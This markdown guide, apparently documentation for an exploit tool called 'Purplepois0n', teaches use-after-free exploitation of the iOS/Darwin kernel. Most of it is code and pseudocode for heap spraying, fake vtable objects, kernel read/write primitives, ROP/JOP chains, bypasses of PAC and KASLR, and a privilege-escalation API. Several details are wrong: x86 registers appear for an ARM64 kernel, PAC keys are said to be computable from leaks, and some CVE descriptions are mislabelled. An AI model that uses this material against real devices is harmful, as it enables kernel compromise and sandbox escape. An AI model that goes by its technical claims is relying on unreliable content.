# Use-After-Free (UAF) Exploitation Guide

## Overview

Use-After-Free is a memory safety vulnerability where a program uses memory after it has been freed. In the iOS/Darwin kernel, this enables:

- **Memory disclosure** (read arbitrary kernel memory)
- **Arbitrary write** (modify kernel memory)
- **Arbitrary code execution** (execute kernel code)
- **Full privilege escalation** (escape sandbox, gain root)

---

## Anatomy of a UAF Exploit

### 1. Vulnerability Phase

```
Normal Flow:
  Object created → Object used → Object freed (✓ safe)

UAF Flow:
  Object created → Object freed → Object used (✗ unsafe!)
                                     ↑
                            Use freed memory!
```

### 2. Three-Stage Exploitation

```
STAGE 1: HEAP GROOMING
├─ Spray heap with controlled objects
├─ Prepare heap state for exploitation
└─ Memorize freed object address

STAGE 2: UAF TRIGGERING
├─ Cause vulnerability to free object
├─ Object is freed but pointer still exists
├─ Reallocate freed memory with attacker data
└─ Object now contains attacker-controlled content

STAGE 3: EXPLOITATION
├─ Trigger code path using freed object
├─ Virtual function call on fake object
├─ Jump to attacker-controlled code
└─ Execute arbitrary kernel code
```

---

## iOS/Darwin Specific Objects

### OSObject (Base Class for IOKit)

```cpp
// Real structure
struct OSObject {
    vtable_t *vtable;      // ← Points to virtual functions
    uint32_t refcount;
    uint32_t flags;
    // ... more fields
};

// Fake structure (created by attacker)
struct FakeOSObject {
    uint64_t fakeVtable;   // ← Points to attacker gadgets
    uint32_t refcount;
    uint32_t flags;
};
```

**Attack:**
1. Free real OSObject
2. Spray heap with FakeOSObject (same size)
3. Freed memory now contains FakeOSObject
4. Trigger virtual function call
5. Calls gadget chain instead of real function

### IPC Port Structure

```cpp
struct ipc_port {
    struct ipc_port_request *requests;     // ← List of requests
    union {
        struct ipc_space *space;           // ← Port's space
        struct ipc_port *port;
    } receiver;
    // ...
};
```

**Attack:**
- Free port while held by user process
- Send messages to reallocate freed space
- Corrupt port structure to gain access to other ports

### Task Structure

```cpp
struct task {
    vm_map_t map;                          // ← Address space
    ipc_space_t itk_space;                 // ← IPC namespace
    security_token_t security_token;       // ← Privileges
    // ...
};
```

**Attack:**
- Modify task's security token via UAF
- Escalate from sandboxed to root

---

## Heap Grooming Techniques

### Technique 1: Kalloc Spraying

```cpp
// Allocate kernel memory via syscalls
for (int i = 0; i < 10000; i++) {
    // Each syscall allocates ~4KB
    posix_spawn(...);  // Creates process (allocates task)
    open(...);         // Creates file descriptor
    socket(...);       // Creates socket
}

// Result: Heap is filled with predictable objects
// When object is freed, we know roughly where it lands
```

### Technique 2: IPC Port Spraying

```cpp
// Create many ports (predictable allocation)
for (int i = 0; i < 5000; i++) {
    mach_port_allocate(mach_task_self(),
                      MACH_PORT_RIGHT_RECEIVE,
                      &ports[i]);
}

// Send messages to trigger allocations at specific sizes
mach_msg_size_t size = 2048;
for (int i = 0; i < 5000; i++) {
    struct {
        mach_msg_header_t header;
        uint8_t data[size];
    } msg = {0};
    
    mach_msg(&msg.header, MACH_SEND_MSG, size, 0,
             ports[i], MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
}
```

### Technique 3: VM Object Spraying

```cpp
// Allocate VM objects via mmap
for (int i = 0; i < 1000; i++) {
    void *ptr = mmap(NULL, 4096 * 1000,
                     PROT_READ | PROT_WRITE,
                     MAP_ANON | MAP_PRIVATE, -1, 0);
    ptrs[i] = ptr;
}

// Each mmap allocates VM object (same size class as target)
```

### Technique 4: File Descriptor Spraying

```cpp
// Open many files (allocates file structures)
for (int i = 0; i < 5000; i++) {
    fds[i] = open("/dev/null", O_RDONLY);
}

// Allocations are predictable size and location
```

---

## Read/Write Primitives

### Read Primitive (Information Leak)

```
Goal: Read arbitrary kernel memory (defeat ASLR)

Method 1: Fake Vtable with gadget chain
  1. Freed object at 0x80000000
  2. Write fake vtable at 0x80010000
  3. Write vtable pointer to freed object: [0x80000000] = 0x80010000
  4. Write fake vtable content:
     [0x80010000] = address of "mov rax, [rdi+8]; ret" gadget
  5. Trigger virtual function call on freed object
  6. Gadget executes: reads memory pointed by freed object + 8
  7. Result in RAX, can trigger exception to leak register

Method 2: IOKit property access
  1. Free IORegistryEntry object
  2. Create fake object with fake property dictionary
  3. Access property → reads our controlled memory location
  4. Extract kernel pointer via error message/exception

Method 3: Mach message header
  1. Free mach_port_t in message buffer
  2. Reallocate with controlled data
  3. Send message → kernel reads our fake data
  4. Extract value from message reply
```

### Write Primitive (Arbitrary Kernel Write)

```
Goal: Write arbitrary kernel memory

Method 1: Fake object with memcpy gadget
  1. Freed object contains source/dest pointers
  2. Fake vtable calls: memcpy(dest, src, size)
  3. Write arbitrary kernel memory

Method 2: IPC port corruption
  1. Corrupt port->ipc_space pointer
  2. Next port operation writes to our location
  3. Write privilege token, security attributes, etc.

Method 3: VM object write
  1. Free VM object
  2. Corruption causes write to page tables
  3. Modify page mappings for privilege escalation
```

---

## Complete UAF Exploit Example

```cpp
// STAGE 1: HEAP GROOMING
void spray_heap() {
    // Fill heap with predictable allocations
    for (int i = 0; i < 10000; i++) {
        posix_spawn(...);  // Allocates task structures
        socket(...);       // Allocates socket buffers
    }
}

// STAGE 2: TRIGGER VULNERABILITY
// (vulnerability-specific, triggers free of target object)

// STAGE 3: HEAP REPLACEMENT
struct FakeOSObject {
    uint64_t fakeVtable;
    uint32_t refcount;
    uint8_t data[4096 - 16];
};

FakeOSObject fake = {
    .fakeVtable = 0x80123456,  // Address of fake vtable
    .refcount = 1,
};

// Reallocate freed space with fake object
for (int i = 0; i < 5000; i++) {
    // Send message matching freed object size
    // Will land on freed object location
    mach_msg(&message, ...);
}

// STAGE 4: EXPLOIT
// Virtual function call on fake object now executes our gadget chain

// STAGE 5: GAIN CODE EXECUTION
// ROP/JOP chain patches kernel to grant privileges
// Return to userland with elevated privileges
```

---

## Gadget Chains

### ROP Chain for Arbitrary Write

```
Gadgets:
  mov rax, [rdi+0x10]; ret          (load source)
  mov rbx, [rsi+0x20]; ret          (load dest)
  mov [rbx], rax; ret               (write)

Stack Layout:
  [RSP+0x00] = pop rdi; ret address
  [RSP+0x08] = source address
  [RSP+0x10] = 0x80123456 (pop rdi; ret)
  [RSP+0x18] = dest address
  [RSP+0x20] = pop rsi; ret address
  ...
```

### JOP Chain for Arbitrary Call

```
Use indirect branches to call functions:
  mov rax, [rsi+offset]; jmp rax

Build chain to:
  1. Set up arguments (rdi, rsi, rdx, rcx)
  2. Call target function
  3. Extract return value
  4. Continue chain or return to userland
```

---

## Defense Bypass

### Mitigations

| Mitigation | Purpose | Bypass |
|-----------|---------|--------|
| **PAC (Pointer Auth)** | Verify pointer authenticity | Leak PAC key via side-channel |
| **KASLR** | Randomize kernel layout | Info leak to discover layout |
| **CFI (Control Flow Integrity)** | Restrict code jumps | Use ROP to simulate valid calls |
| **Zone hardening** | Segregate allocators | Allocate same size in different zone |

### Example: Defeating PAC

```cpp
// PAC signs pointers with key derived from:
// - The pointer value
// - A context (e.g., pointer location)

// Bypass:
1. Leak kernel base (via info leak)
2. Compute expected PAC key from leaked addresses
3. Resign gadget addresses with computed key
4. Use resigned gadgets in ROP chain
```

---

## Integration with Purplepois0n

The `UseAfterFreeExploit` class provides:

```cpp
// Setup
UseAfterFreeExploit uaf;
uaf.initialize(syringe);

// Heap grooming
HeapSpray spray = {
    .allocator = AllocatorType::IPC,
    .objectSize = 2048,
    .objectCount = 5000,
    .objectData = fakeObject,
};
uaf.sprayHeap(spray);

// Trigger UAF
uint64_t freedAddr = 0x80001234;
uint64_t fakeVtable = 0x80010000;
uaf.triggerUAF(freedAddr, fakeVtable);

// Execute gadget chain
GadgetChain chain;
uaf.buildGadgetChain("read_primitive", chain);
uaf.executeGadgetChain(chain);

// Achieve code execution
uint64_t codeAddr;
uaf.achieveArbitraryCodeExecution(codeAddr);
```

---

## Learning Resources

### Key Papers
- "Exploiting Use-After-Free Vulnerabilities" (Phrack Magazine)
- "iOS Hacking: Advanced Practical Attacks" (Blackhat talks)
- "Kernel Exploitation on iOS" (security conferences)

### Real-World CVEs
- **CVE-2021-1732**: IOSurface UAF (used in many iOS jailbreaks)
- **CVE-2020-9839**: IOKit UAF (checkm9)
- **CVE-2021-30765**: IOKitTest UAF

### Tools
- `jtool2` - Binary analysis
- `frida` - Runtime instrumentation
- `lldb` - Kernel debugging (if available)

---

## Security Warnings

⚠️ **Use this only for:**
- Authorized security research
- Educational purposes on your own devices
- CTF competitions
- Defensive security testing

**Do not use for:**
- Unauthorized device access
- Malware development
- Escaping sandboxes without authorization

---

## Future Enhancements

1. **Automated gadget finding** - ROP chain generation
2. **Heap layout prediction** - ML model for allocation patterns
3. **Vulnerability detection** - Identify UAF in binaries
4. **Exploit generation** - Auto-build exploits from vulnerability
5. **PAC handling** - Automatic key recovery and resigning

